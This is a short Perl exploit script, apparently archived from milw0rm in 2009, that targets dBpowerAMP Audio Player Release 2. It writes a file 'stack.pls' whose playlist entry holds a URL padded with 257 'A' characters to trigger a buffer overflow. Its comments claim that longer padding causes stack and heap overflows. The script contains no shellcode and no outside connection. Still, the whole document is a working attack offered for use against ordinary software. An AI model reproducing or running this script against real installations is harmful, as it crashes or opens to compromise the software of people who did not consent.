#!/usr/bin/perl
# dBpowerAMP Audio Player Release 2.PLS Local Buffer Overflow Exploit
# Down : http://www.dbpoweramp.com/bin/dBpowerAMP-r2.exe
# Desc : in 257  A' Basic buffer overflow
#        in 1000 A' Stack overflow
#        in 3000 A' Heap overflow
# By Mountassif Moad a.k.a Stack
# v4 Team & evil finger
use strict;
use warnings;
my $A= "\x41" x 257;
open(my $pls_playlist, "> stack.pls");
print $pls_playlist "[playlist]\r\n".
      "NumberOfEntries=1\r\n".
                    "File1=http://".
                    $A.
                    "\r\n";
close $pls_playlist;

# milw0rm.com [2009-01-13]
